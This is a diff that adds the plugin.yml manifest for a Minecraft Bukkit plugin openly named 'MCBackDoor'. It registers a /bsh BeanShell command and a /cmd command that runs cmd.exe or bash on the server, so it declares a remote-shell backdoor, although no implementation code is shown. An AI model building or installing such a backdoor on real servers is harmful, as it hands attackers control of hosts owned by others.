@@ -1,0 +1,13 @@
+name: MCBackDoor
+main: org.martin.bukkit.mcbackdoor.MCBackDoor
+version: 0.0.1
+authors:
+  - Kekec852
+description: MCBackDoor
+commands:
+  bsh:
+    description: BeanShell
+    usage: /bsh
+  cmd:
+    description: If on windows cmd.exe else linux bash
+    uasge: /cmd
